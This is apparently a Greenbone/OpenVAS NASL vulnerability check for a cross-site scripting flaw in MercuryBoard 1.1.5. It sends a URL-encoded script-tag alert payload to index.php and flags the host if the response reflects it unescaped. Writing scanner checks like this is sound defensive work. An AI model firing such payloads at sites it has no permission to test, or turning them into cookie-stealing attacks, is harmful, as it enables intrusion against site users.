CPE = "cpe:/a:mercuryboard:mercuryboard";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100424" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2010-01-05 18:50:28 +0100 (Tue, 05 Jan 2010)" );
	script_bugtraq_id( 37605 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:N" );
	script_name( "MercuryBoard 'index.php' Cross-Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "MercuryBoard_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "MercuryBoard/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/37605" );
	script_tag( name: "summary", value: "MercuryBoard is prone to a cross-site scripting vulnerability because
  the application fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal
  cookie-based authentication credentials and launch other attacks." );
	script_tag( name: "affected", value: "MercuryBoard 1.1.5 is vulnerable, other versions may also be affected." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
  a newer release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/index.php/%3E%22%3E%3CScRiPt%3Ealert(%27vt-xss-test%27)%3C/ScRiPt%3E";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(isnull( buf )){
	exit( 0 );
}
if(IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) && egrep( pattern: "<ScRiPt>alert\\('vt-xss-test'\\)</ScRiPt>", string: buf, icase: FALSE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

